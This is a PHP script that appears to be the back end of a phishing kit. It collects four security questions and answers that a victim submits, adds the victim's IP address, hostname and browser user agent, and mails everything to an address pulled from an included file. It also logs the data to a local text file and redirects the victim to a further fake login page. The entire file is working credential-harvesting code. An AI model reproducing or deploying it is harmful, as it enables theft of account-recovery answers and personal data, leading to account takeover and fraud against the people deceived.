<?php
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if($_POST["ques1"] != "" and $_POST["ans1"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Citizen  Info-----------------------\n";
$message .= "|question1 : ".$_POST['ques1']."\n";
$message .= "|answer1: ".$_POST['ans1']."\n";
$message .= "|question2 : ".$_POST['ques2']."\n";
$message .= "|answer2: ".$_POST['ans2']."\n";
$message .= "|question3 : ".$_POST['ques3']."\n";
$message .= "|answer3: ".$_POST['ans3']."\n";
$message .= "|question4 : ".$_POST['ques4']."\n";
$message .= "|answer4: ".$_POST['ans4']."\n";

$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- DC --------------|\n";
include 'emfill.php';
$subject = "Citizen| ".$ip."\n";
mail(','.$form,$subject,$message);
    $text = fopen('sgh.txt', 'a');
fwrite($text, $message);
mail($to,$subject,$message);
$praga=(rand(10,100));

header('Location: details.php?cmd=login_submit&id'.$name.''.$name);
}else{
header ("Location: index.php");
}

?>

 
 